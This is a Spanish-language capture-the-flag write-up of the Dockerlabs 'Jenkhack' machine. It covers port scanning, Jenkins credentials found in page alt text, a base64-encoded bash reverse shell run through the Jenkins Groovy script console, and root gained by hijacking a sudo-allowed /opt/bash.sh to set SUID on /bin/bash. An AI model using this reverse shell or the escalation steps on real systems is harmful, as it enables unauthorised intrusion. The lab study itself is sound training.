# Writeup Template: Maquina `[ Jenkhack ]`

- Tags: #Jenkhack
- Dificultad: `[ Facil ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquin Jenkhack](https://mega.nz/file/7MsiyKgJ#F74XXHHsa-24ilYTkbzNmVioEhohGJI5rUYWYL_KEtE) 

## Configuración del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x jenkhack.zip
sudo bash auto_deploy.sh jenkhack.tar
```

---

## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py [IP_TARGET]
# TTL: [64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sC -sV -p80,443,8080 172.17.0.2 -oN targeted
```

**Servicios identificados:**
1. `[ 80 ]/[ TCP ]`: [ Apache ] ([ 2.4.58 ])
2. `[ 443 ]/[ TCP ]`: [ jetty ] ([ 10.0.13 ])
3. `[ 8080 ]/[ TCP ]`: [ jetty ] ([ 10.0.13 ])
---

## Enumeracion de [Servicio Web Principal (jenkhack.hl) ]
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2

# Tenemos un potencial usuario: 
Email[contact@jenkhack.hl]
```

Tenemos **hostDiscovery** por lo cual tendremos que agregar este dominio a nuestro archivo: **( /etc/host )**
```bash
jenkhack.hl
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2 # No reporta nada critico
```
### Descubrimiento de Rutas
Revisando el codigo fuente tenemos estas rutas contempladas:
```bash
<img src="[https://miro.medium.com/v2/resize:fit:1400/0*_n2AQxhJSwAlIMke](view-source:https://miro.medium.com/v2/resize:fit:1400/0*_n2AQxhJSwAlIMke)" alt="jenkins-admin">
<img src="[https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSm9QsnEbRf5NU51IyoPD3LSok3q4d_25auKA&s](view-source:https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSm9QsnEbRf5NU51IyoPD3LSok3q4d_25auKA&s)" alt="cassandra">
<img src="[https://pbs.twimg.com/profile_images/1707408286981472256/ATqgURB5_400x400.jpg](view-source:https://pbs.twimg.com/profile_images/1707408286981472256/ATqgURB5_400x400.jpg)" alt="Hacking Tools">
```

### Credenciales Encontradas
- Usuario: `[ jenkins-admin ]`
- Contraseña: `[ cassandra ]`

Ingresamos al panel de incio de sesion del puerto 8080
```bash
http://172.17.0.2:8080/
```

Ingresamos las passwords:
```bash
username: jenkins-admin
password: cassandra
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Una ves tieniendo el fragmento de codigo con nuestra **revershell** que apunta a nuestra maquina de atacante y estando en escucha por el puerto 443

Ahora estamos dentro del panel administrativo y en esta ruta podremos ejecutar comandos:
```bash
http://172.17.0.2:8080/script
```

[Jenkins RCE with Groovy Script](https://cloud.hacktricks.wiki/en/pentesting-ci-cd/jenkins-security/jenkins-rce-with-groovy-script.html) Aqui tenemos una explicacion detallada de como ejecutar una revershell para ganar acceso al target

Primero tenemos que convertir nuestro **oneLine** en **base64** para ajustarlo al fragmento de codigo
```bash
echo "bash -c 'exec bash -i &>/dev/tcp/172.17.0.1/443 <&1'" | base64

# Resultado
YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTcyLjE3LjAuMS80NDMgPCYxJwo=
```

Tendremos esta cadena en base 64 la cual la acoplamos al codigo quedando asi:
```bash
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTcyLjE3LjAuMS80NDMgPCYxJwo=}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```
### Intrusion
Modo escucha
```bash
nc -nlvp PORT
```

En este cado solo damos click a este boton para ejecutar la instruccion y ganar acceso al **target**
```bash
# Comandos para explotación
Ejecutar
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Comandos clave ejecutados
sudo -l # Sin resultado
find / -perm -4000 2>/dev/null # No encrontamos nada.
```

Tenemos un archivo que pertenece a root pero que tenemos capacidad de lectura:
```bash
cat /var/www/jenkhack/note.txt 

jenkhack:C1V9uBl8!'Ci*`uDfP
```

[CyberChef](https://gchq.github.io/CyberChef/#input=QzFWOXVCbDghJ0NpKmB1RGZQ) Usamos esta web para decodificar esa cadena: y nos reporta que es: **( jenkinselmejor )**

**Hallazgos Clave:**
- Binario con privilegios: `[ /var/www/jenkhack/note.txt ]`
- Credenciales de usuario: `[ jenkhack ]:[ jenkinselmejor ]`
### Explotacion de Privilegios

###### Usuario `[ jenkins ]`:

```bash
# Comando para escalar al usuario: ( jenkhack )
su jenkhack ( jenkinselmejor )
```

###### Usuario `[ jenkhack ]`:

Listamos los privilegios:
```bash
sudo -l

User jenkhack may run the following commands on 71c44529a7a4:
    (ALL : ALL) NOPASSWD: /usr/local/bin/bash # Tenemos una via potencial de escalar a root
```

Listando los permisos vemos que tenemos un archivo:
```bash
 ls -l /usr/local/bin/bash
-rwxr-xr-x 1 root root 16032 Sep  1  2024 /usr/local/bin/bash
```

Listando cadenas legibles de este archivo:
```bash
strings /usr/local/bin/bash
```

Vemos que apunta a esta ruta:
```bash
/opt/bash.sh
```

Listando permisos vemos que pertenece al usuario **root** pero tenemos la capacidad de renombrarlo, Asi que secuestraremos este script para crear el nuestro propio con instrucciones para que otorgue permisos **SUID** a la bash de **root**
```bash
cd /opt/ # Nos movemos a esta ruta
mv bash.sh otro.sh # Modificamos el nombre del script legitimo
nano bash.sh # Cremamos el nuestro que sustituira al legitimo
chmod +x bash.sh # Le damos permiso de ejecucion
```

Este es el contenido de nuestro escript:
```bash
chmod u+s /bin/bash
```

Ahora solo toca ejecutarlo con privilegios para que funcione:
```bash
# Comando para escalar al usuario: ( root )
sudo -u root /usr/local/bin/bash
```

Ahora tendremos la bash con privilegios **SUID**
```bash
jenkhack@71c44529a7a4:/opt$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Ejecutamos una bash con privilegios:
```bash
/bin/bash -p
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
bash-5.2# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a detectar rutas del citio web desde el codigo fuente
2. Aprendimos a ejecutar codigo desde su editor el cual nos permitio ganar acceso al sistema
3. [Lección 3]

## Recomendaciones de Seguridad
- No exponer rutas sensibles del sistema
- Evitar credenciales en archivos: **( note.txt )**
- Usar cifrados robusto para las contrasenas.